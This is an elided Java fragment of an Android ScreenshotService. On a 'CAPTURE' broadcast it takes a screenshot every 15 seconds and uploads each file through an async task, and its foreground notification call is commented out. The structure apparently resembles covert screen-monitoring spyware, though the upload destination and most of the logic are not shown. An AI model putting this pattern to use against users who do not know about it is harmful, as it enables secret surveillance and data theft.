...
public class ScreenshotService extends Service {
  ...
  public void onCreate() {
    ...
    filter.addAction("com.nsromapa.say.action.CAPTURE");
    filter.addAction("com.nsromapa.say.action.STOPCAPTURE");
...
//      foregroundify();
    ...
    new Thread() {
      ...
      public void run() {
        ...
        try {
          ...
          new UploadFileAsync().execute(output.getAbsolutePath());
        }catch (Exception e) {
  ...
  public final BroadcastReceiver receiver = new BroadcastReceiver() {
    ...
    public void onReceive(Context context, Intent intent) {
      ...
      if(action.equals("com.nsromapa.say.action.CAPTURE")){
        if (timer != null) {
          timer.cancel();
          timer.purge();
        }
        ...
        TimerTask timerTaskObj = new TimerTask() {
          public void run() {
            startCapture();
            Log.d("TAG", "onReceive: =====> CAPTURE");
          }
        };
        timer.schedule(timerTaskObj, 0, 15000);
      }else if(action.equals("com.nsromapa.say.action.STOPCAPTURE")){
        if (timer != null) {
          timer.cancel();
          timer.purge();
        }
        Log.d("TAG", "onReceive: =====> STOPCAPTURE");
      } else {
        Log.d("TAG", "onReceive: =====> received not");
      }
    }
  };
